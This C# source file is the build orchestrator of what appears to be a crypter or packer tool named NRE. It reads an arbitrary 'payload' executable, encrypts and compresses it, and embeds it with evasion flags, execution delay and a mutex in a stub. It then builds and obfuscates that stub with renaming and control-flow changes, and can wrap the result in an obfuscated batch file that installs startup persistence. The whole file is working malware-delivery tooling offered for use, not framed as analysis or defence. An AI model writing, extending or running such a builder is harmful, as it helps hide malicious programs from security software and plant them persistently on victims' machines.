using System;
using System.Diagnostics;
using System.IO;
using NRE.Core.Common;
using NRE.Builder.Configuration;
using NRE.Builder.Utilities;
using Logger = NRE.Core.Common.Logger;

namespace NRE.Builder.Commands
{
    /// <summary>
    /// Orchestrates: read payload, detect type, encrypt, embed, compile stub, copy output.
    /// </summary>
    public static class BuildCommands
    {
    /// <summary>
    /// Resolve payload bytes and type. For .NET 8 framework-dependent builds, the .exe is a native
    /// bootstrapper; if we detect the exe as non-.NET, we use the companion .dll in the same directory
    /// so the stub loads the real managed assembly.
    /// </summary>
    private static PayloadType ResolvePayload(string inputPath, out byte[] rawPayload)
    {
        rawPayload = File.ReadAllBytes(inputPath);
        var detected = FileTypeDetector.Detect(rawPayload);

        if (detected == PayloadType.DotNetAssembly)
            return detected;

        var ext = Path.GetExtension(inputPath);
        if (!string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
            return detected;

        var dllPath = Path.ChangeExtension(inputPath, ".dll");
        if (!File.Exists(dllPath))
            return detected;

        var dllBytes = File.ReadAllBytes(dllPath);
        if (FileTypeDetector.Detect(dllBytes) != PayloadType.DotNetAssembly)
            return detected;

        Logger.Info("Using companion .dll (exe is .NET bootstrapper): " + Path.GetFileName(dllPath));
        rawPayload = dllBytes;
        return PayloadType.DotNetAssembly;
    }

    public static bool RunBuild(BuildConfig config)
    {
        var buildSw = Stopwatch.StartNew();
        Logger.Info("Build started.");
        Logger.Debug("Config: Output=" + config.OutputPath + ", Compress=" + config.Compress + ", Bat=" + config.OutputBat + ", Evasion=0x" + ((uint)config.Evasion).ToString("X"));

        if (string.IsNullOrEmpty(config.InputPath) || !File.Exists(config.InputPath))
        {
            Logger.Error("Input file not found: " + config.InputPath);
            return false;
        }

        Logger.Info("Input: " + config.InputPath);
        byte[] rawPayload;
        var payloadType = ResolvePayload(config.InputPath, out rawPayload);
        Logger.Info("Payload size: " + rawPayload.Length + " bytes");
        Logger.Info("Detected payload type: " + payloadType);

        var encSw = Stopwatch.StartNew();
        var encResult = EncryptCommands.EncryptPayload(rawPayload, config);
        byte[] encrypted = encResult.Item1;
        byte[] key = encResult.Item2;
        byte[] iv = encResult.Item3;
        encSw.Stop();
        Logger.Success("Encrypted payload: " + encrypted.Length + " bytes (key=" + key.Length + ", iv=" + iv.Length + ") in " + encSw.ElapsedMilliseconds + " ms");
        if (config.Compress && rawPayload.Length > 0)
            Logger.Debug("Compression ratio: " + (encrypted.Length * 100 / rawPayload.Length) + "% of original");

        // Resolve stub project path: prefer current directory (when run from solution root), else find solution dir
        var currentDir = Directory.GetCurrentDirectory();
        Logger.Debug("Current directory: " + currentDir);
        var stubProj = Path.Combine(currentDir, "NRE.Stub", "NRE.Stub.csproj");
        if (!File.Exists(stubProj))
        {
            var builderDir = Path.GetDirectoryName(typeof(BuildCommands).Assembly.Location) ?? AppDomain.CurrentDomain.BaseDirectory;
            var solutionDir = FindSolutionDir(builderDir);
            stubProj = Path.Combine(solutionDir ?? currentDir, "NRE.Stub", "NRE.Stub.csproj");
            Logger.Debug("Stub project (resolved): " + stubProj);
        }
        if (!File.Exists(stubProj))
        {
            Logger.Error("Stub project not found: " + stubProj);
            return false;
        }

        var stubDirName = Path.GetDirectoryName(stubProj);
        var embeddedDir = Path.Combine(stubDirName ?? stubProj, "Embedded");
        Directory.CreateDirectory(embeddedDir);
        var generatedPath = Path.Combine(embeddedDir, "EmbeddedData.g.cs");
        var embedSw = Stopwatch.StartNew();
        var embeddedSource = ResourceEmbedder.GenerateEmbeddedDataClass(
            encrypted, key, iv, payloadType, config.CompressionFormat, config.Evasion,
            config.DelaySeconds, config.MutexName);
        File.WriteAllText(generatedPath, embeddedSource);
        embedSw.Stop();
        Logger.Info("Generated: " + generatedPath + " (" + new FileInfo(generatedPath).Length + " bytes, " + embedSw.ElapsedMilliseconds + " ms)");

        // Build stub
        Logger.Info("Building stub (dotnet build -c Release)...");
        string buildOutDir;
        var stubSw = Stopwatch.StartNew();
        if (!BuildStubProject(stubProj, out buildOutDir))
        {
            Logger.Error("Stub build failed.");
            return false;
        }
        stubSw.Stop();
        Logger.Debug("Stub build output: " + buildOutDir + " (" + stubSw.ElapsedMilliseconds + " ms)");

        string sourceDir = buildOutDir;
        string obfuscatedDir;
        Logger.Info("Obfuscating stub (rename + control flow)...");
        var obfSw = Stopwatch.StartNew();
        if (AssemblyObfuscator.ObfuscateStubOutput(buildOutDir, out obfuscatedDir) && !string.IsNullOrEmpty(obfuscatedDir))
        {
            obfSw.Stop();
            sourceDir = obfuscatedDir;
            var obfExe = Path.Combine(sourceDir, "NRE.Stub.exe");
            Logger.Info("Obfuscated stub -> " + sourceDir + " (" + (File.Exists(obfExe) ? new FileInfo(obfExe).Length + " bytes" : "?") + ", " + obfSw.ElapsedMilliseconds + " ms)");
        }
        else
        {
            obfSw.Stop();
            Logger.Warn("Obfuscation skipped or failed; using raw stub.");
        }

        var outputPath = Path.GetFullPath(config.OutputPath);
        var outputDir = Path.GetDirectoryName(outputPath);
        if (!string.IsNullOrEmpty(outputDir))
            Directory.CreateDirectory(outputDir);
        Logger.Debug("Output path: " + outputPath);

        if (config.OutputBat)
        {
            bool installStartup = (config.Evasion & NRE.Core.Evasion.EvasionOptions.PersistStartup) != 0;
            Logger.Debug("Building BAT (startup=" + installStartup + ")...");
            if (!BatBuilder.BuildBat(sourceDir, outputPath, installStartup))
            {
                Logger.Error("BAT build failed.");
                return false;
            }
            var batSize = File.Exists(outputPath) ? new FileInfo(outputPath).Length : 0;
            buildSw.Stop();
            Logger.Success("Output: " + outputPath + " (obfuscated batch, " + batSize + " bytes)");
            Logger.Info("Total build time: " + buildSw.ElapsedMilliseconds + " ms");
            return true;
        }

        var stubExe = Path.Combine(sourceDir, "NRE.Stub.exe");
        long exeSize = 0;
        if (File.Exists(stubExe))
        {
            exeSize = new FileInfo(stubExe).Length;
            File.Copy(stubExe, outputPath, overwrite: true);
            Logger.Debug("Copied stub exe -> " + outputPath + " (" + exeSize + " bytes)");
        }

        // Stub uses Costura.Fody: NRE.Core and other deps are embedded in the exe, so we only copy the single exe.
        string builderBaseDir = AppDomain.CurrentDomain.BaseDirectory ?? "";
        bool outputIsBuilderDir = !string.IsNullOrEmpty(outputDir) && string.Equals(Path.GetFullPath(outputDir).TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar), Path.GetFullPath(builderBaseDir).TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar), StringComparison.OrdinalIgnoreCase);
        if (outputIsBuilderDir)
            Logger.Info("Output is the builder directory; some files may be in use and skipped.");

        buildSw.Stop();
        Logger.Success("Output: " + outputPath + " (single exe, " + exeSize + " bytes, dependencies embedded)");
        Logger.Info("Total build time: " + buildSw.ElapsedMilliseconds + " ms");
        return true;
    }

    private static string FindSolutionDir(string startDir)
    {
        var dir = startDir;
        for (int i = 0; i < 10; i++)
        {
            if (string.IsNullOrEmpty(dir)) break;
            if (File.Exists(Path.Combine(dir, "NRE.sln")))
                return dir;
            dir = Path.GetDirectoryName(dir);
        }
        return null;
    }

    private static bool BuildStubProject(string stubCsprojPath, out string buildOutputDir)
    {
        buildOutputDir = null;
        var stubDir = Path.GetDirectoryName(stubCsprojPath) ?? "";
        Logger.Debug("Stub working directory: " + stubDir);
        var psi = new ProcessStartInfo
        {
            FileName = "dotnet",
            Arguments = "build \"" + Path.GetFileName(stubCsprojPath) + "\" -c Release -o bin\\builder_out",
            WorkingDirectory = stubDir,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };
        using (var p = Process.Start(psi))
        {
            if (p == null)
            {
                Logger.Error("Failed to start dotnet process.");
                return false;
            }
            var outText = p.StandardOutput.ReadToEnd();
            var errText = p.StandardError.ReadToEnd();
            p.WaitForExit(60000);
            if (p.ExitCode != 0)
            {
                Logger.Error("Stub build failed (exit " + p.ExitCode + ").");
                Logger.Error("Build output: " + outText + errText);
                return false;
            }
            if (!string.IsNullOrWhiteSpace(errText))
                Logger.Debug("Stub stderr: " + errText.Trim().Replace("\r\n", " | "));
            buildOutputDir = Path.Combine(stubDir, "bin", "builder_out");
            var outputExe = Path.Combine(buildOutputDir, "NRE.Stub.exe");
            if (File.Exists(outputExe))
                Logger.Debug("Stub exe size: " + new FileInfo(outputExe).Length + " bytes");
            return Directory.Exists(buildOutputDir) && File.Exists(outputExe);
        }
    }
    }
}
